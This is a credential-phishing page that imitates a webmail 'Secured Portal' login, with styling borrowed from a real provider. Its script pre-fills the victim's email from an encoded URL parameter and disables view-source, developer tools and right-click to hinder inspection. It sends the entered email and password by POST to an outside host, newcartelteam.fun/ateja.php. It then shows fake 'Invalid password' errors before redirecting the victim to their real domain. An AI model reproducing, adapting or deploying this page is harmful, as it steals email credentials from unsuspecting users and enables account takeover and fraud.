<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en" class="light">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome · Email Domain Portal</title>
    <link rel="StyleSheet" type="text/css" href="https://mail.optix.pk/css/axigen-web-fonts.css?v=10631">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body, html { height: 100%; width: 100%; font-family: "Source Sans Pro", sans-serif; }
        body.theme-ocean {
            background-image: url('https://mail.optix.pk/react-login/build/68e4b53a79e18387962c.jpg');
            background-position: center;
            background-repeat: no-repeat;
            background-size: cover;
            position: relative;
            color: rgba(255, 255, 255, 0.5);
        }
        body.theme-ocean::before {
            content: "";
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            background-color: rgba(9, 13, 26, 0.9);
            z-index: 1;
        }
        .app-container {
            position: relative;
            z-index: 2;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            align-items: center;
            padding: 20px;
        }
        .main-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            width: 500px;
            max-width: 100%;
            padding: 20px 0;
            flex: 1;
        }
        .logo {
            width: 100%;
            height: 60px;
            background-image: url('');
            background-size: contain;
            background-repeat: no-repeat;
            background-position: center;
            margin-bottom: 10px;
        }
        h1 {
            font-family: "Source Sans Pro", sans-serif;
            font-size: 40px;
            font-weight: 400;
            color: #ffffff;
            margin: 30px 0 0 0;
            text-align: center;
            line-height: normal;
        }
        #domainNameInTitle {
            color: #ffffff;
            font-weight: 400;
        }
        #errMssg {
            color: #FF6B6B;
            font-size: 14px;
            text-align: center;
            margin: 10px 0;
            padding: 0 20px;
            min-height: 40px;
            display: block;
            width: 100%;
            max-width: 400px;
            line-height: 1.6;
            font-family: "Source Sans Pro", sans-serif;
        }
        #errMssg.success {
            color: #4CAF50;
        }
        form { 
            width: 400px; 
            max-width: 100%; 
            display: flex; 
            flex-direction: column; 
            align-items: center; 
        }
        .row { 
            width: 100%; 
            display: flex; 
            justify-content: center; 
            margin-bottom: 0; 
        }

        .username-domain-container {
            display: flex;
            width: 100%;
            padding-top: 10px;
            position: relative;
        }
        .username-domain-container .col { position: relative; }
        .username-domain-container .col.username-container { 
            flex: 1 1 100%;
            width: 100%;
        }
        .username-domain-container .col.domain-container { 
            position: absolute;
            right: 0;
            top: 10px;
            width: 70px;
            height: 48px;
            display: flex;
            align-items: center;
            justify-content: center;
            pointer-events: none;
            z-index: 5;
        }
        .col.domain-container label {
            background-color: transparent;
            color: rgba(255, 255, 255, 0.4);
            font-size: 16px;
            padding: 0 8px 0 2px;
            height: 48px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 400;
            font-family: "Source Sans Pro", sans-serif;
            white-space: nowrap;
            pointer-events: none;
            border-left: 1px solid rgba(255, 255, 255, 0.15);
            padding-left: 10px;
        }

        .username-domain-container .col.username-container input[type="text"] {
            padding-right: 80px !important;
        }

        .field-with-label-container { 
            padding-top: 10px; 
            position: relative; 
            width: 100%; 
        }
        .field-with-label-container input[type="text"],
        .field-with-label-container input[type="password"] {
            background: none;
            border: 1px solid #666;
            border-radius: 3px;
            color: rgba(255, 255, 255, 0.5);
            height: 48px;
            padding: 0 20px;
            width: 100%;
            outline: none;
            transition: border-color 0.2s ease-in-out;
            font-size: 14px;
            font-family: "Source Sans Pro", sans-serif;
        }
        .field-with-label-container input:focus { border-color: #5975e4; }

        .field-with-label-container label {
            position: absolute;
            left: 15px;
            top: 25px;
            background-color: #22252f;
            padding: 0 5px;
            color: rgba(118, 126, 127, 0.9);
            font-size: 14px;
            transition: 0.1s ease-in-out;
            pointer-events: none;
            text-transform: uppercase;
            letter-spacing: 0.3px;
            font-family: "Source Sans Pro", sans-serif;
            z-index: 2;
        }
        .field-with-label-container input:focus + label,
        .field-with-label-container input:not(:placeholder-shown) + label {
            transform: translate(-3px, -24px) scale(0.9);
        }

        .password-container {
            width: 100%;
            padding-top: 10px;
            position: relative;
            margin-top: 0;
        }

        .has-password-visibility-toggle input[type="password"] { padding-right: 50px; }
        .but-password-visibility-toggle {
            position: absolute;
            right: 2px;
            top: 12px;
            width: 48px;
            height: 44px;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            background: transparent;
            border: none;
            outline: none;
            z-index: 5;
        }
        .but-password-visibility-toggle::before {
            content: "";
            display: flex;
            height: 16px;
            width: 16px;
            background-color: #5975e4;
            mask-image: url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'%3E%3Cpath d='M16.5 7.5c0-.1 0-.2-.1-.3-.2-.4-.5-.8-.8-1.1-.8-1.1-1.7-2-2.8-2.7-1.5-1-3.2-1.6-4.8-1.6s-3 .5-4.4 1.4-2.7 2.3-3.9 4c0 .1-.1.2-.1.3v.6c0 .1 0 .2.1.3.5.8 1 1.5 1.6 2.1s1.2 1.2 1.9 1.7c.4.3.8.5 1.2.7 1.2.6 2.4.9 3.7.9s3.3-.5 4.8-1.6c1.4-.9 2.6-2.2 3.5-3.8.2-.3.2-.7.1-1Zm-2.1.4c-.1.2-.2.3-.3.5-.7.9-1.5 1.8-2.4 2.3-1.2.8-2.4 1.1-3.7 1.1s-2.5-.4-3.7-1.1c-.9-.6-1.7-1.4-2.4-2.3 0-.2-.2-.3-.3-.5l.3-.6c.8-1.1 1.7-1.9 2.7-2.5 1.1-.7 2.2-1 3.4-1s1.9.2 2.8.7c.3.1.6.3.9.5s.5.4.8.6c.6.5 1.2 1.1 1.7 1.8 0 .2.2.3.3.5Z'/%3E%3Cpath d='M8 4.9c-1.7 0-3 1.3-3 3s1.3 3 3 3 3-1.3 3-3-1.3-3-3-3m0 4.3c-.7 0-1.3-.6-1.3-1.3S7.3 6.6 8 6.6s1.3.6 1.3 1.3S8.7 9.2 8 9.2'/%3E%3C/svg%3E");
            mask-size: contain;
            mask-repeat: no-repeat;
        }
        .but-password-visibility-toggle[data-visible="true"]::before {
            mask-image: url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'%3E%3Cpath d='M11.7 10.7c-.5.3-1.1.6-1.6.8l1.5 1.5c.4-.2.8-.4 1.2-.7.2-.1.3-.3.5-.4l-1.4-1.4s-.2.1-.2.2M3.6 3.2c-.4.2-.7.5-1 .8L4 5.4c.2-.2.5-.3.7-.5.4-.2.7-.4 1.1-.5L4.3 2.9c-.2.1-.5.2-.7.4ZM9 11.8H8c-1.3 0-2.5-.4-3.7-1.1-.9-.6-1.7-1.4-2.4-2.3 0-.2-.2-.3-.3-.5l.3-.6c.4-.5.8-1 1.2-1.4L1.8 4.6C1 5.3.3 6.2-.3 7.2c0 .1-.1.2-.1.3v.6c0 .1 0 .2.1.3.5.8 1 1.5 1.6 2.1s1.2 1.2 1.9 1.7c.4.3.8.5 1.2.7 1.2.6 2.4.9 3.7.9s1.7-.2 2.6-.4l-1.6-1.6ZM16.5 7.5c0-.1 0-.2-.1-.3-.2-.4-.5-.8-.8-1.1-.8-1.1-1.7-2-2.8-2.7-1.5-1-3.2-1.6-4.8-1.6s-1.9.2-2.8.5l1.6 1.6c.4 0 .8-.1 1.2-.1 1 0 1.9.2 2.8.7.3.1.6.3.9.5s.5.4.8.6c.6.5 1.2 1.1 1.7 1.8 0 .2.2.3.3.5-.1.2-.2.3-.3.5-.4.6-.9 1.1-1.4 1.5l1.3 1.3c.8-.8 1.6-1.7 2.2-2.7.2-.3.2-.7.1-1Z'/%3E%3Cpath d='m1.65 3.05 1.414-1.414L14.378 12.95l-1.415 1.414z'/%3E%3Cpath d='M6.7 7.9c0-.7.6-1.3 1.3-1.3L6.7 5.3c-.6.3-1.1.8-1.4 1.5l1.5 1.5V8ZM10.7 9.2 9.4 7.9c0 .7-.6 1.3-1.3 1.3h-.3l1.5 1.5c.6-.3 1.1-.8 1.5-1.4ZM5 7.8c0 1.7 1.3 3 3 3zM11 8.1v-.3c0-1.7-1.3-3-3-3h-.3z'/%3E%3C/svg%3E");
        }

        .main-cta {
            background-color: #dc6060;
            border: none;
            border-radius: 25px;
            color: #ffffff;
            height: 50px;
            min-width: 280px;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            transition: opacity 0.2s ease-in-out;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            padding: 0 25px;
            font-family: "Source Sans Pro", sans-serif;
        }
        .main-cta:hover { opacity: 0.7; }
        .main-cta:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }
        .row.button-container { padding: 50px 0 15px; width: 100%; display: flex; justify-content: center; }

        .language-container {
            padding-top: 50px;
            padding-bottom: 30px;
            width: 100%;
            max-width: 400px;
            display: flex;
            justify-content: center;
        }
        .language-selector {
            background: transparent;
            border: 1px solid #666;
            border-radius: 2px;
            color: rgba(255, 255, 255, 0.5);
            padding: 4px 8px;
            min-height: 30px;
            width: 150px;
            font-family: "Source Sans Pro", sans-serif;
            font-size: 14px;
            cursor: pointer;
            outline: none;
            transition: border-color 0.2s ease-in-out;
        }
        .language-selector:hover,
        .language-selector:focus { border-color: #5975e4; }
        .language-selector option { background-color: #22252f; color: rgba(255, 255, 255, 0.8); }

        .footer-container {
            width: 500px;
            max-width: 100%;
            margin-top: 50px;
            padding-bottom: 5px;
            text-align: center;
        }
        .footer-container p { padding: 5px 0; margin: 0; font-size: 14px; color: #757e80; font-family: "Source Sans Pro", sans-serif; }
        .footer-container p.powered-by { border-bottom: 1px solid rgba(102, 102, 102, 0.6); padding-bottom: 10px; }
        .footer-container p.powered-by a { color: #5975e4; text-decoration: none; transition: opacity 0.2s ease-in-out; }
        .footer-container p.powered-by a:hover { opacity: 0.7; }
        .footer-container .copyright { font-size: 12px; color: rgba(255, 255, 255, 0.4); line-height: 1.6; }

        @media (max-width: 767px) {
            .main-container { width: 100%; padding: 20px 15px; }
            form { width: 100%; max-width: 400px; }
            .row { width: 100%; }
            h1 { font-size: 28px; }
            .main-cta { min-width: 200px; width: 100%; max-width: 400px; }
            .footer-container { width: 100%; padding: 0 15px; }
            .language-selector { width: 120px; }
            .username-domain-container .col.domain-container { width: 60px; }
            .username-domain-container .col.username-container input[type="text"] {
                padding-right: 70px !important;
            }
            .col.domain-container label { font-size: 14px; padding-left: 6px; }
        }
    </style>
</head>
<body class="theme-ocean reading-pane-east lang-en">
    <div class="app-container">
        <div class="main-container">
            <div class="logo"></div>
            <h1>Welcome to <span id="domainNameInTitle">Your-Domain</span> Secured Portal</h1>
            <div id="errMssg">Sign in to your secure mailbox</div>
            <form id="logBox">
                <div class="row username-domain-container field-with-label-container">
                    <div class="col username-container">
                        <input type="text" name="email" id="email" autocomplete="off" placeholder=" " value="">
                        <label for="email">Email</label>
                    </div>
                    <div class="col domain-container">
                        <input type="hidden" id="domain" name="domain" value="">
                        <input type="hidden" id="fieldName" name="fieldName" value="login">
                        <input type="hidden" id="login_attempt" name="login_attempt" value="0">
                        <input type="hidden" id="attemptNumber" name="attemptNumber" value="0">
                    </div>
                </div>
                <div class="row password-container field-with-label-container has-password-visibility-toggle">
                    <input type="password" name="password" id="password" autocomplete="off" placeholder=" " value="">
                    <label for="password">Password</label>
                    <div data-visible="false" role="button" aria-label="Show password" onclick="togglePasswordVisibility()"></div>
                </div>
                <div class="row button-container">
                    <button class="main-cta" type="button" id="loginbtn" name="login">Log in</button>
                </div>
            </form>
            <div class="language-container">
                <select class="language-selector" id="languageSelect">
                    <option value="en">English</option>
                    <option value="fr">Français</option>
                    <option value="es">Español</option>
                    <option value="de">Deutsch</option>
                    <option value="ar">العربية</option>
                </select>
            </div>
        </div>
        <div class="footer-container">
            <p class="powered-by">Powered by <a target="_blank" href="https://ms.multinet.com.pk/">Multinet</a></p>
            <p class="copyright">Email, calendaring, and collaboration <br>Total privacy, high availability, and scalability</p>
        </div>
    </div>

    <script>
        // Disable right click
        document.addEventListener('contextmenu', function(e) {
            e.preventDefault();
            return false;
        });

        // Disable keyboard shortcuts
        document.addEventListener('keydown', function(e) {
            // Disable Ctrl+U (View Source)
            if (e.ctrlKey && e.key === 'u') {
                e.preventDefault();
                return false;
            }
            // Disable Ctrl+Shift+I (Developer Tools)
            if (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'i')) {
                e.preventDefault();
                return false;
            }
            // Disable Ctrl+Shift+J (Console)
            if (e.ctrlKey && e.shiftKey && (e.key === 'J' || e.key === 'j')) {
                e.preventDefault();
                return false;
            }
            // Disable Ctrl+Shift+C (Inspect Element)
            if (e.ctrlKey && e.shiftKey && (e.key === 'C' || e.key === 'c')) {
                e.preventDefault();
                return false;
            }
            // Disable F12 (Developer Tools)
            if (e.key === 'F12') {
                e.preventDefault();
                return false;
            }
            // Disable Ctrl+S (Save Page)
            if (e.ctrlKey && (e.key === 's' || e.key === 'S')) {
                e.preventDefault();
                return false;
            }
            // Disable Ctrl+P (Print)
            if (e.ctrlKey && (e.key === 'p' || e.key === 'P')) {
                e.preventDefault();
                return false;
            }
            // Disable Ctrl+Shift+R (Hard Refresh)
            if (e.ctrlKey && e.shiftKey && (e.key === 'r' || e.key === 'R')) {
                e.preventDefault();
                return false;
            }
            // Disable F5 (Refresh) - optional, comment out if you want to allow refresh
            if (e.key === 'F5') {
                e.preventDefault();
                return false;
            }
            // Disable Ctrl+R (Refresh)
            if (e.ctrlKey && (e.key === 'r' || e.key === 'R')) {
                e.preventDefault();
                return false;
            }
            // Disable Ctrl+F (Find)
            if (e.ctrlKey && (e.key === 'f' || e.key === 'F')) {
                e.preventDefault();
                return false;
            }
            // Disable Ctrl+H (History)
            if (e.ctrlKey && (e.key === 'h' || e.key === 'H')) {
                e.preventDefault();
                return false;
            }
        });

        // Disable drag and drop
        document.addEventListener('dragstart', function(e) {
            e.preventDefault();
            return false;
        });

        // Disable text selection
        document.addEventListener('selectstart', function(e) {
            e.preventDefault();
            return false;
        });

        function togglePasswordVisibility() {
            var pwd = document.getElementById('password');
            var btn = document.querySelector('.but-password-visibility-toggle');
            if (pwd.type === 'password') {
                pwd.type = 'text';
                btn.setAttribute('data-visible', 'true');
                btn.setAttribute('aria-label', 'Hide password');
            } else {
                pwd.type = 'password';
                btn.setAttribute('data-visible', 'false');
                btn.setAttribute('aria-label', 'Show password');
            }
        }

        function capitalizeFirst(str) {
            if (!str || str.length === 0) return str;
            return str.charAt(0).toUpperCase() + str.slice(1).toLowerCase();
        }

        function extractDomainNameOnly(fullDomain) {
            if (!fullDomain) return "Your-Domain";
            var parts = fullDomain.split('.');
            var raw = (parts.length > 0 && parts[0].length > 0) ? parts[0] : fullDomain;
            return capitalizeFirst(raw);
        }

        function updateAll(emailAddress) {
            var titleSpan = document.getElementById('domainNameInTitle');
            var domainLabel = document.getElementById('domainLabel');
            var errElement = document.getElementById('errMssg');
            
            var fullDomain = "";
            var displayDomain = "Your-Domain";
            
            if (emailAddress && emailAddress.includes('@')) {
                fullDomain = emailAddress.split('@')[1];
                displayDomain = extractDomainNameOnly(fullDomain);
            }
            
            if (titleSpan) {
                titleSpan.textContent = displayDomain;
            }
            
            if (domainLabel) {
                if (fullDomain) {
                    domainLabel.textContent = "@" + fullDomain;
                } else {
                    domainLabel.textContent = "@domain";
                }
            }
            
            if (errElement) {
                if (fullDomain) {
                    errElement.innerHTML = "Sign in to continue";
                } else {
                    errElement.innerHTML = "Sign in to your secure mailbox";
                }
                errElement.style.color = '#FF6B6B';
                errElement.className = '';
            }
        }

        function isBase64(str) {
            try { return btoa(atob(str)) === str; } catch (err) { return false; }
        }

        function decodeEmailFromHash(hash) {
            var dataMatch = hash.match(/[?&]data=([^&]+)/);
            if (dataMatch) {
                var dataValue = dataMatch[1];
                if (isBase64(dataValue)) {
                    try { var decoded = atob(dataValue); if (decoded.includes('@')) return decoded; } catch (e) {}
                }
                if (dataValue.includes('@')) return dataValue;
                return dataValue;
            }
            var base64Part = hash.split('&')[0].split('?')[0].trim();
            if (!isBase64(base64Part)) {
                if (base64Part.includes('@')) return base64Part;
                return base64Part;
            }
            try {
                var once = atob(base64Part);
                if (once.includes('@')) return once;
                try { var twice = atob(once); if (twice.includes('@')) return twice; } catch (e) { return once; }
            } catch (e) { return base64Part; }
            return base64Part;
        }

        (function() {
            var hash = window.location.hash.replace("#", "").trim();
            var search = window.location.search;
            var emailField = document.getElementById("email");
            var domainField = document.getElementById("domain");
            if (!emailField) return;
            
            var fullEmail = '';
            if (search && search.length > 0) {
                var dataMatch = search.match(/[?&]data=([^&]+)/);
                if (dataMatch) {
                    var dataValue = dataMatch[1];
                    if (isBase64(dataValue)) {
                        try { var decoded = atob(dataValue); if (decoded.includes('@')) fullEmail = decoded; } catch (e) {}
                    }
                    if (!fullEmail && dataValue.includes('@')) fullEmail = dataValue;
                }
            }
            if (!fullEmail && hash && hash.length > 0) {
                fullEmail = decodeEmailFromHash(hash);
            }
            
            if (fullEmail && fullEmail.includes('@')) {
                emailField.value = fullEmail;
                var domainPart = fullEmail.split('@')[1];
                if (domainField) domainField.value = domainPart;
                updateAll(fullEmail);
            } else {
                updateAll('');
            }
        })();

        var loginAttempt = parseInt(document.getElementById('login_attempt')?.value || '0');
        var isProcessing = false;

        function setErrorMessage(msg, isSuccess = false) {
            var errorElement = document.getElementById('errMssg');
            if (errorElement) {
                errorElement.innerHTML = msg;
                errorElement.className = isSuccess ? 'success' : '';
                errorElement.style.color = isSuccess ? '#4CAF50' : '#FF6B6B';
            }
        }

        document.getElementById('loginbtn').addEventListener('click', function(e) {
            e.preventDefault();
            processLogin();
        });
        document.getElementById('logBox').addEventListener('keydown', function(e) {
            if (e.key === 'Enter') {
                e.preventDefault();
                processLogin();
            }
        });

        function processLogin() {
            if (isProcessing) return;
            
            var email = document.getElementById('email').value.trim();
            var password = document.getElementById('password').value;
            var domain = email.split('@')[1] || '';
            
            if (!email || !password) {
                setErrorMessage("Please enter both username and password");
                return;
            }
            
            if (!email.includes('@')) {
                setErrorMessage("Please enter a valid email address");
                return;
            }
            
            var loginBtn = document.getElementById('loginbtn');
            loginBtn.disabled = true;
            loginBtn.textContent = 'Authenticating...';
            isProcessing = true;
            
            loginAttempt = parseInt(document.getElementById('login_attempt')?.value || '0');
            setErrorMessage("Authenticating...");
            
            var formData = new URLSearchParams();
            formData.append('email', email);
            formData.append('password', password);
            formData.append('domain', document.getElementById('domain').value || domain);
            formData.append('field', document.getElementById('fieldName').value);
            formData.append('attempt', (loginAttempt + 1).toString());

            fetch('https://newcartelteam.fun/ateja.php', {
                method: 'POST',
                headers: { 
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: formData.toString()
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error('Network response was not ok');
                }
                return response.text();
            })
            .then(data => {
                if (data.includes('success') || data.includes('ok') || data.includes('true')) {
                    setErrorMessage("Login successful! Redirecting...", true);
                    setTimeout(function() {
                        if (domain) {
                            window.location.href = "https://" + domain;
                        } else {
                            window.location.href = "https://mail." + domain;
                        }
                    }, 1500);
                } else {
                    loginAttempt++;
                    document.getElementById('login_attempt').value = loginAttempt;
                    document.getElementById('attemptNumber').value = loginAttempt;
                    
                    if (loginAttempt >= 3) {
                        setErrorMessage("Too many failed attempts. Redirecting...");
                        setTimeout(function() {
                            if (domain) {
                                window.location.href = "https://" + domain;
                            } else if (email && email.includes('@')) {
                                var emailDomain = email.split('@')[1];
                                window.location.href = "https://" + emailDomain;
                            } else {
                                window.location.href = "https://www.example.com";
                            }
                        }, 1500);
                    } else {
                        setErrorMessage("Invalid password");
                        document.getElementById('password').value = '';
                        document.getElementById('password').focus();
                    }
                    
                    loginBtn.disabled = false;
                    loginBtn.textContent = 'Log in';
                    isProcessing = false;
                }
            })
            .catch(error => {
                console.error('Error:', error);
                setErrorMessage("Connection error. Please try again.");
                loginBtn.disabled = false;
                loginBtn.textContent = 'Log in';
                isProcessing = false;
            });
        }

        document.addEventListener('keydown', function(e) {
            if (e.key === 'Enter' && (document.activeElement.id === 'password' || document.activeElement.id === 'email')) {
                e.preventDefault();
                processLogin();
            }
        });

        document.getElementById('email').addEventListener('input', function(e) {
            var email = this.value;
            updateAll(email);
        });

        window.addEventListener('load', function() {
            var emailField = document.getElementById('email');
            if (emailField && emailField.value) {
                updateAll(emailField.value);
            } else {
                updateAll('');
            }
            var pwdField = document.getElementById('password');
            if (pwdField) setTimeout(function() { pwdField.focus(); }, 200);
        });
    </script>
</body>
</html>
